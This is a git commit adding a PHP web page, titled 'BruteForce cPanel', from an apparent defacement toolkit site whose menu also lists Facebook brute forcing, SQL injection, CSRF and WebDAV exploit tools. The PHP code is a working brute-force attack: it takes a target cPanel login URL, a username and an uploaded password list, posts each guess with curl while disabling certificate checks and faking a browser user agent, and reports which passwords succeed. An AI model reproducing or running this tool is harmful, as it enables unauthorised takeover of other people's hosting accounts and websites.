1a41c268a94b2b338ed212acbc1132481638552d
Noniod7 <41842911+Noniod7@users.noreply.github.com>
2021-10-01 07:36:41 +0700

    Add files via upload

---
+++ brute-cp/index.php
@@ -0,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    
+    <title>
+        BruteForce cPanel
+    </title>
+
+    <!-- Global stylesheets -->
+    <link href="../../external.html?link=https://fonts.googleapis.com/css?family=Roboto:400,300,100,500,700,900" rel="stylesheet" type="text/css">
+    <link href="../assets/css/icons/styles.min.css" rel="stylesheet" type="text/css">
+    <link href="../assets/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+    <link href="../assets/css/bootstrap_limitless.min.css" rel="stylesheet" type="text/css">
+    <link href="../assets/css/layout.min.css" rel="stylesheet" type="text/css">
+    <link href="../assets/css/components.min.css" rel="stylesheet" type="text/css">
+    <link href="../assets/css/colors.min.css" rel="stylesheet" type="text/css">
+
+    <script src="../assets/js/main/jquery.min.js"></script>
+    <script src="../assets/js/main/bootstrap.bundle.min.js"></script>
+    <script src="../assets/js/plugins/loaders/blockui.min.js"></script>
+  
+    <script src="../assets/js/plugins/visualization/d3/d3.min.js"></script>
+    <script src="../assets/js/plugins/visualization/d3/d3_tooltip.js"></script>
+    <script src="../assets/js/plugins/forms/styling/switchery.min.js"></script>
+    <script src="../assets/js/plugins/forms/selects/bootstrap_multiselect.js"></script>
+    <script src="../assets/js/plugins/ui/moment/moment.min.js"></script>
+    <script src="../assets/js/plugins/pickers/daterangepicker.js"></script>
+
+    <script src="../assets/js/app.js"></script>
+
+</head>
+<body>
+
+	<div class="navbar navbar-expand-md navbar-dark" style="background-color: black">
+		<div class="navbar-brand">
+			<<img src="../assets/img/niod.png" width="100" height="100"> 
+   </a>
+		</div>
+<b><font face="Courier New">
+		<div class="d-md-none">
+			
+			<button class="navbar-toggler sidebar-mobile-main-toggle" type="button">
+				<i class="icon-paragraph-justify3"></i>
+			</button>
+		</div>
+
+		<div class="collapse navbar-collapse" id="navbar-mobile">
+			<ul class="navbar-nav">
+				<li class="nav-item">
+					<a href="#" class="navbar-nav-link sidebar-control sidebar-main-toggle d-none d-md-block">
+						<i class="icon-paragraph-justify3"></i>
+					</a>
+				</li>
+
+			</ul>
+			<ul class="navbar-nav">
+			<span class="badge bg-success ml-md-3 mr-md-auto">Online
+			</span>
+		    </ul>
+		</div>
+	</div>
+
+	<div class="page-content">
+
+		<div class="sidebar sidebar-dark sidebar-main sidebar-expand-md" style="background-color: black">
+
+		
+			<div class="sidebar-mobile-toggler text-center">
+				<a href="#" class="sidebar-mobile-main-toggle">
+					<i class="icon-arrow-left8"></i>
+				</a>
+				Navigation
+				<a href="#" class="sidebar-mobile-expand">
+					<i class="icon-screen-full"></i>
+					<i class="icon-screen-normal"></i>
+				</a>
+			</div>
+		
+			<div class="sidebar-content">
+
+
+
+		
+				<div class="card card-sidebar-mobile">
+					<ul class="nav nav-sidebar" data-nav-type="accordion">
+
+						
+						<li class="nav-item">
+							<a href="../index.php" class="nav-link active">
+								<i class="icon-home2"></i>
+								<span>
+									HOME
+								</span>
+							</a>
+						</li>
+						<li class="nav-item nav-item-submenu">
+							<a href="#" class="nav-link"><i style="color: red;" class="icon-bug2"></i> <span>DEFACER TOOLS</span></a>
+							<ul class="nav nav-group-sub" data-submenu-title="Layouts">
+ <li class="nav-item">
+	<li class="nav-item">
+	<a href="../admin-find" class="nav-link">Admin Finder</a>
+</li>
+<li class="nav-item">
+	<a href="index.php" class="nav-link">Bruteforce cPanel</a>
+</li>
+<li class="nav-item">
+	<a href="../brute-fb" class="nav-link">Bruteforce Facebook</a>
+</li>
+<li class="nav-item">
+	<a href="../csrf" class="nav-link">CSRF Online</a>
+</li>
+<li class="nav-item">
+  <a href="../printing-dios" class="nav-link">Printing Dios SQLi</a>
+</li>
+<li class="nav-item">
+	<a href="../webdav" class="nav-link">Webdav Xploiter</a>
+</li>
+</ul>
+</li>
+						<li class="nav-item nav-item-submenu">
+							<a href="#" class="nav-link"><i style="color: #6699FF;" class="icon-embed2"></i> <span>PROGRAMING TOOLS</span></a>
+
+							<ul class="nav nav-group-sub" data-submenu-title="Themes">
+								<li class="nav-item"><a href="../encode-decode/index.html" class="nav-link">Encode - Decode</a></li>
+           <li class="nav-item"><a href="../perapi-html" class="nav-link">Perapi HTML & CSS / C Style</a></li>
+							</ul>
+						</li>
+						<li class="nav-item nav-item-submenu">
+							<a href="#" class="nav-link"><i style="color: yellow;" class="icon-brain"></i> <span>CTF</span></a>
+
+							<ul class="nav nav-group-sub" data-submenu-title="Starter kit">
+								<li class="nav-item"><a href="../../error.html" class="nav-link disabled">Easy to Difficult<span class="badge bg-transparent align-self-center ml-auto">Coming soon</span></a></li>
+							</ul>
+						</li>
+						<li class="nav-item nav-item-submenu">
+							<a href="#" class="nav-link"><i style="color: #666633;" class="icon-mirror"></i> <span>Mirror</span></a>
+							<ul class="nav nav-group-sub" data-submenu-title="Starter kit">
+								<li class="nav-item"><a href="../zone-h" class="nav-link">Zone-H Notifer</a></li>
+							</ul>
+						</li>
+						<li class="nav-item nav-item-submenu">
+							<a href="#" class="nav-link"><i style="color: #CCFFCC;" class="icon-grid5"></i> <span>Other</span></a>
+
+							<ul class="nav nav-group-sub" data-submenu-title="Themes">
+								<li class="nav-item">
+								<a href="../css-mini" class="nav-link ">CSS Minifier</a>
+							</ul>
+							<ul class="nav nav-group-sub" data-submenu-title="Themes">
+								<li class="nav-item">
+								<a href="../word-coun" class="nav-link ">Word Counter</a></li>
+							</ul>
+						</li>
+
+						<li class="nav-item-header"><div class="text-uppercase font-size-xs line-height-xs">Info</div> <i class="icon-menu-open" title="Forms"></i></li>
+						<li class="nav-item">
+							<a href="../../index2f8a.html" class="nav-link"><i style="color: #FFFFFF;" class="icon-info22"></i> <span>Contact</span></a>
+						</li>
+						<li class="nav-item">
+							<a href="../../indexe476.html" class="nav-link"><i style="color: #FFFFFF;" class="icon-coin-dollar"></i> <span>Donasi</span></a>
+						</li>
+						<li class="nav-item">
+							<a href="../../index90ae.html#beli" class="nav-link"><i style="color: gold;" class="icon-cart5"></i> <span>Buy Tools</span></a>
+						</li>
+										
+
+					</ul>
+				</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="content-wrapper">
+
+
+			<div class="page-header page-header-light">
+				<div class="page-header-content header-elements-md-inline">
+					
+
+					
+				</div>
+
+				<div class="breadcrumb-line breadcrumb-line-light header-elements-md-inline">
+					<div class="d-flex">
+						<div class="breadcrumb">
+							<a href="../index.html" class="breadcrumb-item"><i class="icon-home2 mr-2"></i> Home</a>
+							
+						</div>
+					</div>
+
+					
+				</div>
+			</div>        
+        <div class="content">
+            <div class="card">
+                <center><br>
+                <h3 class="tile-title"><i class="fa fa-exclamation-triangle"></i><b> Bruteforce Cpanel</b></h3>
+                
+                </center>
+            </div>
+          
+                    <div class="card">
+                        <div class="card-body">
+
+                                
+                <?php
+error_reporting(0);
+
+$lgurll = $_POST['lgurll'];
+$user = $_POST['tguser'];
+
+echo '<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<center>
+';
+
+if(isset($_POST['startbf']) && !empty($lgurll) && !empty($user) && $_FILES['netfile']['size'] !== 0){
+$textkskc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123457890';
+$panj = 15;
+$txtl = strlen($textkskc)-1;
+$uploadz = '';
+for($i=1; $i<=$panj; $i++){
+$uploadz .= $textkskc[rand(0, $txtl)];
+}
+if(move_uploaded_file($_FILES['netfile']['tmp_name'], $uploadz)){
+$passlists = file_get_contents($uploadz);
+unlink($uploadz);
+}else{
+$passlists = '';
+}
+$listspass = explode("\n", $passlists);
+if(isset($_POST['brift'])){
+foreach($listspass as $pass){
+if(logcp($lgurll, urlencode($user), urlencode($pass))){
+echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="green">True</font><br/>'."\n";
+break;
+}else{
+echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="red">False</font><br/>'."\n";
+}
+}
+}else{
+foreach($listspass as $pass){
+if(logcp($lgurll, urlencode($user), urlencode($pass))){
+echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="green">True</font><br/>'."\n";
+}else{
+echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="red">False</font><br/>'."\n";
+}
+}
+}
+}else{
+echo '<form method="post" enctype="multipart/form-data">
+<b><font size="4" color="black">cPanel Brute Force</font></b><br/>
+<font color="gray">Work On cPanel And Localhost</font><br/>
+<b>Login Url</b><br/>
+<input type="text" size="30" name="lgurll" placeholder="Login Url" value="'.htmlspecialchars($lgurll).'"><br/>
+<b>Username</b><br/>
+<input type="text" size="30" name="tguser" placeholder="Username" value="'.htmlspecialchars($user).'"><br/>
+<b>Password Lists</b><br/>
+<input type="file" name="netfile"><br/>
+<input type="checkbox" name="brift" value="Break If True"><font color="blue">Break If True</font><br/>
+<input type="submit" name="startbf" value="START">
+</form>
+';
+}
+
+echo '</center>
+</body>';
+
+function logcp($urllog, $login_email, $login_pass){
+$cookielog = 'gsh_cookie';
+$fp = fopen($cookielog, 'w');
+fwrite($fp, '');
+fclose($fp);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $urllog.'/login');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'user='.$login_email.'&pass='.$login_pass.'&login=Login');
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookielog);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookielog);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3');
+curl_setopt($ch, CURLOPT_REFERER, $urllog);
+$page = curl_exec($ch) or die('<font color="red">Can\'t Connect to Host</font>');
+if(eregi('"target":"file_manager"', $page)){
+return TRUE;
+}else{
+return FALSE;
+}
+}
+?>
+                                                                     </div>
+        
+     </div>       
+        </div>
+			<center>
+							<div class="navbar  navbar-light">
+				<div class="navbar-collapse" id="">
+					<span class="navbar-text"><font face="Courier New">
+						&copy; 2019. <a href="#">Noniod7</a> all rights reserved<br>
+					</span>
+				</div>
+			</div>
+			</center></body>
+</html>
